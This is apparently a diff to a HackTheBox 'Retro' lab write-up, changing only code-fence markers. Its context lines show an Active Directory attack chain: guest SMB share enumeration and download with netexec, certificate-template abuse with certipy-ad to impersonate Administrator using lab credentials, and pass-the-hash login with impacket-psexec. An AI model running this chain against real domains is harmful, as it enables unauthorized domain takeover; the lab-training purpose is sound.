@@ -84,7 +84,7 @@ HOP RTT      ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 97.77 seconds
-```bash
+```
 
 ```
 ares@legion:~/HackTheBox/Retro$ netexec smb $target -u 'guest' -p '' --shares
@@ -100,7 +100,7 @@ SMB         10.129.234.44   445    DC               NETLOGON                    
 SMB         10.129.234.44   445    DC               Notes                           
 SMB         10.129.234.44   445    DC               SYSVOL                          Logon server share                                                                                      
 SMB         10.129.234.44   445    DC               Trainees        READ            
-```bash
+```
 ```bash
 ares@legion:~/HackTheBox/Retro$ netexec smb $target -u 'guest' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=. EXCLUDE_FILTER='PRINT$','IPC$','SYSVOL','NETLOGON' EXCLUDE_EXTS='lnk','ini','ico'
 SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
@@ -157,7 +157,7 @@ Stop bothering us. Please. We have other stuff to do than resetting your passwor
 Regards
 
 The Admins  
-```bash
+```
 ```bash
 ares@legion:~/HackTheBox/Retro$ cat ToDo.txt     
 Thomas,
@@ -208,7 +208,7 @@ ADCS        10.129.47.169   389    DC               [*] Starting LDAP search wit
 ADCS        10.129.47.169   389    DC               Found PKI Enrollment Server: DC.retro.vl
 ADCS        10.129.47.169   389    DC               Found CN: retro-DC-CA
 
-```bash
+```
 ```bash
 certipy-ad find -u 'banking$' -p 'beer1!' -dc-ip $target -vulnerable -stdout
 ```
@@ -247,7 +247,7 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
     userAccountControl                  : 66048
     whenCreated                         : 2023-07-23T21:07:55+00:00
     whenChanged                         : 2025-05-05T07:11:09+00:00
-```bash
+```
 ```
 certipy-ad req -u 'banking$' -p 'beer1!' -dc-ip $target -ca retro-DC-CA -template RetroClients -upn Administrator@retro.vl -sid S-1-5-21-2983547755-698260136-4283918172-500  -key-size 4096
 ```bash
@@ -255,6 +255,6 @@ certipy-ad req -u 'banking$' -p 'beer1!' -dc-ip $target -ca retro-DC-CA -templat
 
 ```bash
 impacket-psexec retro.vl/Administrator@$target -hashes :252fac7066d93dd009d4fd2cd0368389
-```bash
+```
 
 
